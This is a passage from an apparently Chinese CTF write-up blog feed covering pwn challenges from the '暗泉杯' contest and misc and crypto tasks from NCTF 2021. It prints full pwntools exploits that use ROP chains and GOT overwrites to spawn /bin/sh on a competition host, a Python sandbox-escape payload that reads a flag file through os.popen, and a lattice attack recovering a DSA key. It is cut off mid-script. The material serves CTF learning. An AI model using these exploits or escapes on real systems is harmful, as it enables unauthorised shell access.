&#123;</span><br><span class="line">.text:00000000004011D5                 push    rbp</span><br><span class="line">.text:00000000004011D6                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011D9                 sub     rsp, 20h</span><br><span class="line">.text:00000000004011DD                 mov     eax, 0</span><br><span class="line">.text:00000000004011E2                 call    init</span><br><span class="line">.text:00000000004011E7                 lea     rax, format     ; &quot;Hi there! What is your name? &quot;</span><br><span class="line">.text:00000000004011EE                 mov     rdi, rax        ; format</span><br><span class="line">.text:00000000004011F1                 mov     eax, 0</span><br><span class="line">.text:00000000004011F6                 call    _printf</span><br><span class="line">.text:00000000004011FB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011FF                 mov     edx, 18h        ; nbytes</span><br><span class="line">.text:0000000000401204                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401207                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040120C                 call    _read</span><br><span class="line">.text:0000000000401211                 lea     rax, s          ; &quot;That is an interesting chall&quot;</span><br><span class="line">.text:0000000000401218                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040121B                 call    _puts</span><br><span class="line">.text:0000000000401220                 lea     rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;</span><br><span class="line">.text:0000000000401227                 mov     rdi, rax        ; format</span><br><span class="line">.text:000000000040122A                 mov     eax, 0</span><br><span class="line">.text:000000000040122F                 call    _printf</span><br><span class="line">.text:0000000000401234                 mov     eax, 0</span><br><span class="line">.text:0000000000401239                 call    read_long</span><br><span class="line">.text:000000000040123E                 add     rbp, rax           ; 加操作</span><br><span class="line">.text:0000000000401241                 mov     eax, 0</span><br><span class="line">.text:0000000000401246                 leave</span><br><span class="line">.text:0000000000401247                 retn</span><br><span class="line">.text:0000000000401247 ; &#125; // starts at 4011D5</span><br><span class="line">.text:0000000000401247 main            endp</span><br></pre></td></tr></table></figure><p>接着的 <code>leave</code> 是 <code>mov rsp,rbp; pop rbp</code>，rsp将变为rbp+rax，控制rax为-0x20-8，结合 <code>leave</code> 操作可以将rsp移动到 <code>buf</code> 处以写入ROP链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./justdoit.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = binary.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>)).__next__()</span><br><span class="line">pop2 = binary.search(asm(<span class="string">&#x27;pop r14; pop r15; ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line">payload += p64(binary.plt.puts)</span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binary.got.puts)</span><br><span class="line">payload += p64(pop2)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - libc.sym.puts</span><br><span class="line">log.info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">payload += p64(libc.sym.system)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag：<code>ctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;</code>。</p><p>​    </p><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><blockquote><p>nc 47.106.172.144 65003</p></blockquote><p>IDA分析，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;need&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;luck! &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">9uLL</span>);</span><br><span class="line">  v3 = (_DWORD *)atoi(nptr);</span><br><span class="line">  *v3 = buf;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buf</code> 和 <code>nptr</code> 都无溢出点，但可以向 <code>buf</code> 写入4字节并覆盖掉写入<code>nptr</code>中值对应地址的内容。</p><p>可以任意地址写，考虑将 <code>atoi</code> 改为libc中的 <code>system</code>，再向 <code>system</code> 传入 <code>/bin/sh\x00</code> 即可getshell，为达成两步利用，还需将 <code>exit</code> 改为 <code>main</code> 地址。</p><p><code>atoi</code> 与<code>system</code> 的偏移只有最后2字节不同，又由于ASLR开启，后1.5字节为0，所以有0.5/8=1/16的几率能将 <code>atoi</code> 改为 <code>system</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./reallNeedGoodLuck.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;WARN&#x27;</span></span><br><span class="line"></span><br><span class="line">attempt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65003</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">        tout = <span class="number">1.0</span></span><br><span class="line"></span><br><span class="line">        attempt += <span class="number">1</span></span><br><span class="line">        log.warn(<span class="string">&#x27;attempt: &#x27;</span> + <span class="built_in">str</span>(attempt))</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(binary.sym.main))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.exit).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(((libc.sym.system | <span class="number">0xf000</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.atoi - <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,<span class="string">b&#x27;0000&#x27;</span>,timeout=tout)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,timeout=tout)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="string">b&#x27;echo test&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;test&#x27;</span> <span class="keyword">in</span> p.recvline(timeout=tout):</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> AssertionError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>flag：<code>ctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/</id>
    <published>2021-11-28T12:53:29.000Z</published>
    <updated>2021-11-28T19:29:51.642Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><ul><li>比赛时间：2021.11.27 9:00-2021.11.28 21:00</li><li>比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分</li><li>注册队伍登陆后，请在Profile页面绑定队伍成员信息</li><li>每支队伍至少绑定一个成员，不超过4人，校内队伍所有成员请填写<strong>真实姓名</strong>和正确<strong>学号</strong>，校外队伍至少绑定一个成员，以便颁奖时联系。</li><li>未绑定成员信息的队伍可以正常解题但不参与排名</li><li>成员信息一经绑定不可更改</li><li>禁止对平台进行攻击</li><li>禁止与其他队伍交流解题思路</li><li>请在比赛结束后12小时内发送详细解题思路（pdf格式）到邮箱nctf@h4ck.fun</li></ul><p>Rank: 10</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><blockquote><p>find it</p></blockquote><p>签到，<code>https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D</code>，链接就有flag：<code>NCTF&#123;Welcome_to_NCTF_2021!&#125;</code>。</p><p>​    </p><h3 id="Hex酱的秘密花园"><a href="#Hex酱的秘密花园" class="headerlink" title="Hex酱的秘密花园"></a>Hex酱的秘密花园</h3><blockquote><p>我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~<br>但是为了防止有些居心叵测的人，我们专门 把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~<br>Ubuntu Python3.6.9<br>快去找Hex酱(QQ:2821876761)私聊吧<br>私聊发送的信息为明文，不需要加base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">code = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = b64decode(code.encode()).decode()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;h&quot;\&#x27;(&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> data: exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(data)</span><br></pre></td></tr></table></figure></blockquote><p>挺有趣的结合了QQBot的python逃逸，由代码知需传入python代码段，不能包含括号、单双引号和字母h，最后<code>exec</code> 函数执行。</p><p>断掉了 <code>print()</code> 和 <code>help()</code> 输出方式，可以采用python中的语法糖 <code>@</code> 类装饰器，在创建类时触发装饰器中的代码逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">95</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">41</span></span><br><span class="line">y=<span class="keyword">lambda</span> z:x</span><br><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="meta">@eval</span></span><br><span class="line"><span class="meta">@bytes</span></span><br><span class="line"><span class="meta">@y</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read()</span></span><br></pre></td></tr></table></figure><p>Bot返回flag：<code>NCTF&#123;HexQBot_1s_s0_cut3~&#125;</code>。</p><p>​    </p><h3 id="做题做累了来玩玩游戏吧"><a href="#做题做累了来玩玩游戏吧" class="headerlink" title="做题做累了来玩玩游戏吧"></a>做题做累了来玩玩游戏吧</h3><blockquote><p>做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～<br>对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持</p></blockquote><p>Unity3D 游戏，主逻辑都在 <code>Assembly-CSarp.dll</code> 中，找到文件：</p><p><code>PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll</code></p><p>用ILSpy查看dll程序逻辑，发现最终通过访问 <code>http://h4ck.fun/g4me.txt</code> 获取flag：<code>NCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;</code>。</p><p>​    </p><h3 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h3><blockquote><p>问卷链接：<a href="https://forms.gle/RcKhJo2uQwQrL4Gu9">https://forms.gle/RcKhJo2uQwQrL4Gu9</a><br>提示：是Google问卷</p></blockquote><p>签退，答完就有flag：<code>NCTF&#123;Thank_y0u_for_your_participation&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="dsa"><a href="#dsa" class="headerlink" title="dsa"></a>dsa</h3><blockquote><p>flag格式nctf{.*}，题目见附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">522</span>)</span><br><span class="line">        q = p//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    g = <span class="number">3</span></span><br><span class="line">    h = long_to_bytes(getPrime(<span class="number">256</span>))</span><br><span class="line">    x = <span class="built_in">int</span>.from_bytes(h*<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    <span class="keyword">return</span> g, p, q, y, x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">h, x</span>):</span></span><br><span class="line">    k = sha256(h.encode().<span class="built_in">hex</span>().encode()).digest()+sha256(<span class="built_in">bytes</span>.fromhex(h)+x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).digest()</span><br><span class="line">    k = <span class="built_in">int</span>.from_bytes(k, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    r = <span class="built_in">pow</span>(g,k,p)</span><br><span class="line">    s = (r*x+<span class="built_in">int</span>(h,<span class="number">16</span>))*inverse(k,q)%q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">g, p, q, y, x = keygen()</span><br><span class="line">flag = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>],<span class="number">16</span>)^<span class="built_in">int</span>(sha256(x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>)</span><br><span class="line">r, s = sign(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:], x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line"><span class="string">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line"><span class="string">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line"><span class="string">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line"><span class="string">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DSA签名算法，将明文 $m$ 与私钥 $x$ 哈希值 $h(x)$ 的异或值 $H=m \oplus h(x)$ 传入<code>sign()</code> 函数，并将 $H$ 与 $h(H+x)$ 连接得到的 $k$ 作为临时密钥，计算 $r=g^k \bmod p$ 和 $s=(rx+H)k^{-1} \bmod q$，给出签名结果 $(r,s)$，求私钥 $x$。</p><p>已知 $g,q,p=2q+1,y,H,r,s$，$x$ 为512位，根据 <code>x = int.from_bytes(h*2, &quot;big&quot;)</code> 可知  $x \mid (2^{256}+1)$，设 $x=(2^{256}+1)d’$，则 $d’$ 也是256位。</p><p>$k$ 由 $H$ 与 $h(H+x)$ 连接得到，$H$ 已知，即 $k$ 的高256位已知，低256位未知，设 $k=2^{256}H+h’$。</p><p>根据 $s=(rx+H)k^{-1} \bmod q$，有：</p><p>$(2^{256}H+h’)s-(2^{256}+1)d’r-H \equiv 0 \pmod q$ </p><p>利用coppersmith定理构造格，通过LLL算法计算 $(h’,d’)$，这里采用small_roots脚本攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">d = f.degree()</span><br><span class="line"></span><br><span class="line">R = f.base_ring()</span><br><span class="line">N = R.cardinality()</span><br><span class="line"></span><br><span class="line">f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">base = N^(m-i) * f^i</span><br><span class="line"><span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">G.append(g)</span><br><span class="line"></span><br><span class="line">B, monomials = G.coefficient_matrix()</span><br><span class="line">monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">B = B.change_ring(QQ)</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">H.append(h)</span><br><span class="line">I = H.ideal()</span><br><span class="line"><span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">H.pop()</span><br><span class="line"><span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">roots = []</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">roots.append(root)</span><br><span class="line"><span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">q=<span class="number">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line">g=<span class="number">3</span></span><br><span class="line">y=<span class="number">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line">h=<span class="number">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line">r=<span 